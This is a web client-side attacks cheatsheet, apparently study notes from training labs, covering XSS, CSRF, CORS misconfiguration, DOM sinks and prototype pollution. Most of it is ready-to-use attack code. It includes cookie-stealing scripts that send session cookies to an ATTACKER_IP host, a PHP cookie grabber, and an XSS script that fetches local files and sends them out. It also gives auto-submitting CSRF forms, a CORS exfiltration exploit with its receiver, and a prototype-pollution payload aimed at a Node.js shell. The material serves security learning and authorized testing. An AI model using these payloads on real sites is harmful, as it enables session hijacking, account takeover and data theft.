---
title: "Web Client-Side Attacks Cheatsheet"
type: cheatsheet
tags: [cheatsheet, client-side, cors, csrf, dom, exploitation, prototype-pollution, thm, web, xss]
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [thm-adv-xss, thm-adv-csrf, thm-adv-dom-attacks, thm-adv-cors-sop, thm-web-xss, portswigger-scripts]
---

# Web Client-Side Attacks Cheatsheet

## XSS Payloads

```javascript
// Basic PoC
<script>alert(1)</script>
<script>alert(document.cookie)</script>

// Tag-based (no script keyword)
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

// Attribute injection (break out of attribute)
" onmouseover="alert(1)
"><script>alert(1)</script>

// Inside JS string
';alert(document.cookie)//
\';alert(document.cookie)//

// href/src protocol
javascript:alert(document.cookie)

// Whitespace evasion (break blocklist patterns)
<IMG SRC="jav&#x09;ascript:alert('XSS');">   # TAB
<IMG SRC="jav&#x0A;ascript:alert('XSS');">   # LF
<IMG SRC="jav&#x0D;ascript:alert('XSS');">   # CR

// No parentheses (length bypass)
alert`1`
```

## XSS Cookie Stealing

```javascript
// Redirect (noisy)
<script>document.location='http://ATTACKER_IP:1337/grab.php?c='+document.cookie</script>

// Image trick (silent, no redirect)
<script>var i=new Image();i.src="http://ATTACKER_IP:1337/?c="+document.cookie;</script>

// Fetch (modern)
<script>fetch('http://ATTACKER_IP/?c='+btoa(document.cookie))</script>

// With location
<script>var i=new Image();i.src="http://ATTACKER_IP:1337/?loc="+document.location;</script>
```

## Cookie Grabber Server

```php
<?php
// cookiegrabber.php — save stolen cookies to file
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' . $cookie . "\r\n");
fclose($fp);
?>
```

Host: `php -S 0.0.0.0:1337`  or Apache.

## XSS File Exfiltration (SSRF-via-XSS)

```javascript
// exfil.js — serve from attacker, load via <script src>
fetch('http://127.0.0.1/secret/pass.txt')
  .then(r => r.text())
  .then(data => {
    let img = document.createElement('img');
    img.src = 'http://ATTACKER_IP:8000/catch?data=' + encodeURIComponent(data);
    document.body.appendChild(img);
  });
```

Inject: `<script src="http://ATTACKER_IP:80/exfil.js"></script>`

## CSRF — Auto-Submit Form Templates

```html
<!-- GET-based CSRF (hidden image) -->
<img src="https://target.com/action?param=evil" width="0" height="0">

<!-- POST auto-submit form -->
<form id="csrf" method="POST" action="https://target.com/changepassword">
  <input type="hidden" name="new_password" value="hacked">
  <input type="hidden" name="csrf_token" value="STOLEN_OR_PREDICTED_TOKEN">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- XMLHttpRequest CSRF -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/api/update', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.send('email=attacker@evil.com');
</script>

<!-- SameSite Lax bypass: trigger logout to reset 2-min window, then POST -->
<script>
function attack() {
    let w = window.open("https://target.com/logout", '');
    setTimeout(() => { w.close(); document.getElementById('f').submit(); }, 1000);
}
</script>
<form id="f" style="display:none" method="POST" action="https://target.com/sensitive">
  <input name="action" value="malicious">
</form>
```

## CORS Test Headers

```bash
# Test arbitrary origin reflection
curl -sI -H "Origin: https://evil.com" https://target.com/api/data | grep -i access-control

# Test null origin
curl -sI -H "Origin: null" https://target.com/api/data | grep -i access-control

# Test bad regex (target.com anywhere in origin)
curl -sI -H "Origin: https://target.com.evil.com" https://target.com/api/data | grep -i access-control

# Vulnerable response looks like:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

## CORS Exfiltration Exploit

```html
<body onload="exploit()">
<script>
function exploit() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            var xhr2 = new XMLHttpRequest();
            xhr2.open("POST", "http://ATTACKER_IP:81/receiver.php", true);
            xhr2.withCredentials = true;
            var b = this.responseText;
            var a = new Uint8Array(b.length);
            for (var i = 0; i < a.length; i++) a[i] = b.charCodeAt(i);
            xhr2.send(new Blob([a]));
        }
    };
    xhttp.open("GET", "http://target.com/sensitive.php", true);
    xhttp.withCredentials = true;
    xhttp.send();
}
</script>
</body>
```

`receiver.php` on attacker Apache:
```php
<?php
header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
header('Access-Control-Allow-Credentials: true');
file_put_contents('data.txt', file_get_contents("php://input"));
?>
```

## DOM XSS Sink List

```
innerHTML          # Parses HTML, executes event handlers
outerHTML          # Same as innerHTML
document.write()   # Injects raw HTML into document stream
document.writeln() # Same
eval()             # Executes JS string
setTimeout(str)    # Executes string as JS
setInterval(str)   # Executes string as JS
new Function(str)  # Creates function from string
location.href = .. # javascript: URI executes
src / href         # Set to javascript: URI
$.html() / $()     # jQuery — string starting with < is HTML
v-html (Vue)       # Renders HTML, unsafe with user data
dangerouslySetInnerHTML (React)  # Renders HTML
```

## DOM Sources (attacker-controllable)

```
location.hash          # URL fragment #...
location.search        # URL query string ?...
location.href          # Full URL
document.URL           # Full URL
document.referrer      # Referer header
window.name            # Set by opener window
postMessage data       # Cross-origin message
localStorage           # If attacker can write
document.cookie        # If not HttpOnly
```

## Prototype Pollution Detection

```javascript
// URL parameter injection
?__proto__[testprop]=polluted
?constructor.prototype.testprop=polluted

// JSON body injection
{"__proto__": {"testprop": "polluted"}}
{"constructor": {"prototype": {"testprop": "polluted"}}}

// Verify in browser console after sending
console.log({}.testprop)  // "polluted" = vulnerable
```

## Prototype Pollution Payloads

```javascript
// Override security check
?__proto__[isAdmin]=true
{"__proto__": {"isAdmin": true}}

// Pollute for DOM gadget XSS
{"__proto__": {"innerHTML": "<img src=1 onerror=alert(1)>"}}

// Node.js shell (via vulnerable merge + child_process gadget)
{"__proto__": {"shell":"node","NODE_OPTIONS":"--require /proc/self/fd/0"}}
```

## XSS Filter Bypass Quick Reference

| Technique | Payload |
|-----------|---------|
| Mixed case | `<ScRiPt>alert(1)</sCrIpT>` |
| No parentheses | `alert\`1\`` |
| HTML entities | `&lt;script&gt;` (for testing encoding) |
| Tab in attribute | `<IMG SRC="jav&#x09;ascript:alert(1);">` |
| No closing tag | `<img src=x onerror=alert(1)` |
| SVG | `<svg><script>alert(1)</script></svg>` |
| `javascript:` URI | `<a href="javascript:alert(1)">click` |

## Quick Checklist

**XSS:**
- [ ] Reflected: test all URL params, form fields, headers with `<script>alert(1)</script>`
- [ ] Stored: submit to every form that persists data
- [ ] DOM: search JS for `innerHTML`, `document.write`, `eval`, `location.hash`; trace to source
- [ ] Context: HTML / attribute / JS string / URL — adapt payload to context

**CSRF:**
- [ ] Is there a CSRF token? Remove it — does the request succeed?
- [ ] Is the token predictable / base64-decodable?
- [ ] What is the `SameSite` attribute on the session cookie?
- [ ] Does the endpoint accept GET for state changes?
- [ ] Is `Referer` the only validation? (Can be stripped)

**CORS:**
- [ ] Send `Origin: https://evil.com` — is it reflected in `Access-Control-Allow-Origin`?
- [ ] Is `Access-Control-Allow-Credentials: true` set?
- [ ] Test `Origin: null`
- [ ] Test subdomain variant if target domain appears in origin check

**Prototype Pollution:**
- [ ] Inject `?__proto__[x]=1` in URL, check `{}.x` in console
- [ ] Try JSON body `{"__proto__": {"x": 1}}`
- [ ] Look for deep merge / `lodash.merge` / `jquery.extend(true, ...)` calls

## Related Pages

- [[xss]]
- [[csrf]]
- [[dom-attacks]]
- [[cors-sop]]
- [[prototype-pollution]]
- [[http-request-smuggling]]
